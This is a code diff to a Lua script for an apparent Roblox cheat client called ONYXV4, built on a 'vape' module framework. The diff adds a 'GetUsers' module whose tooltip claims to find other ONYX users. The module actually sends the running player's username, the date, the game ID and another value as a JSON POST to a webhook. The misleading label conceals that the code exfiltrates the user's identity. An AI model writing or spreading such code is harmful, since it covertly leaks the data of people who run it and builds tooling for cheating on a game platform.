@@ -34,6 +34,7 @@ local s1 = {
         .. date
         .. " in the gameid "
         .. game.PlaceId
+		.. " | "
 		.. fisishsiterlbx
 }
 
@@ -279,6 +280,41 @@ run(function()
                 })
                 msg = FPS:CreateTextBox({
                     Name = "FPS"
+                })
+           end)
+           run(function()
+                local GetUsers
+                GetUsers = vape.Legit:CreateModule({
+                    Name = "GetUsers",
+                    Tooltip = "gets anyone whos using ONYX! via by the cloud",
+                    Function = function(callback)
+                        if not callback then
+                            return
+                        end
+                        GetUsers:Toggle(false)
+                        date = os.date("%d-%m-%Y")
+
+                        local s1 = {
+                            content = lplr.Name
+                                .. " has injected ONYXV4 at "
+                                .. date
+                                .. " in the gameid "
+                                .. game.PlaceId
+                                .. " | "
+                                .. fisishsiterlbx
+                        }
+
+                        local req = request or http_request or syn.request
+
+                        req({
+                            Url = webhook,
+                            Method = "POST",
+                            Headers = {
+                                ["Content-Type"] = "application/json"
+                            },
+                            Body = HttpService:JSONEncode(s1)
+                        })
+                    end
                 })
            end)
         end
